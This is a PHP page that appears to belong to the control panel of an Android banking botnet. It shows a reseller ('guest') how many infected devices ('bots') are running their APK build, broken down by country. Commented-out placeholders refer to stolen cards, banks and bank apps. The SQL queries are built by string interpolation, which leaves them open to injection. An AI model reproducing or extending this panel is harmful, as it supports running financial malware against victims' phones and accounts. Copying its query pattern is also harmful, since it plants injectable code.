<?php session_start();
include '../db.php';
if (!(isset($_SESSION['guest_id']))) {
	header("Location: login.php");
    return;
}  
?>

<?php
$guest_id = $_SESSION['guest_id'];
$get_guest_info_sql = "SELECT * FROM `guest` WHERE `guest_id` = $guest_id";
$get_guest_info_sql_res = $mysqli->query($get_guest_info_sql);
$guest_info = $get_guest_info_sql_res->fetch_assoc();
$seller = $guest_info["apk_version"];
//var_dump($guest_info);
$html = '';
$myData_ar = array();
$mylabel_ar = array();
$myData_html = '';
$mylabel_html = '';

$query = "SELECT * FROM `kliets` WHERE version_apk REGEXP '$seller'";
$result = $mysqli->query($query);
$count = $result->num_rows;

$distinct_sql = "SELECT DISTINCT `country` FROM `kliets` WHERE `version_apk` REGEXP '$seller'";
$distinct_sql_res = $mysqli->query($distinct_sql);
while ($country = $distinct_sql_res->fetch_assoc()) {
	array_push($mylabel_ar, $country["country"]);
}

foreach ($mylabel_ar as $country) {
	$all_in_country_sql = "SELECT * FROM `kliets` WHERE `country` = '$country' AND `version_apk` REGEXP '$seller'";
	$all_in_country_res = $mysqli->query($all_in_country_sql);
	array_push($myData_ar, $all_in_country_res->num_rows);

	$myData_html .= "['$country - $all_in_country_res->num_rows', $all_in_country_res->num_rows],";
	#$mylabel_html .= "";

}


$html = file_get_contents("templates/guest.tpl");
$html = str_replace('%%PLACE_TOTAL_BOTS_COUNT%%', $count, $html);
$html = str_replace('%%PLACE_MYDATA_HERE%%', $myData_html, $html);


#$html = str_replace('%%PLACE_CARDS_HERE%%', $all_cards_count, $html);
#$html = str_replace('%%PLACE_BANKS_HERE%%', $all_bank_count, $html);

#$html = str_replace('%%PLACE_ONLINE_HERE%%', $online_bots, $html);
#$html = str_replace('%%PLACE_OFFLINE_HERE%%', $offline_bots, $html);
#$html = str_replace('%%PLACE_BANK_APPS_HERE%%', $bank_apps_count, $html);

#$html = str_replace('%%PLACE_ANDROID_VER_HERE%%', $android_ver_html, $html);

echo $html;

?>
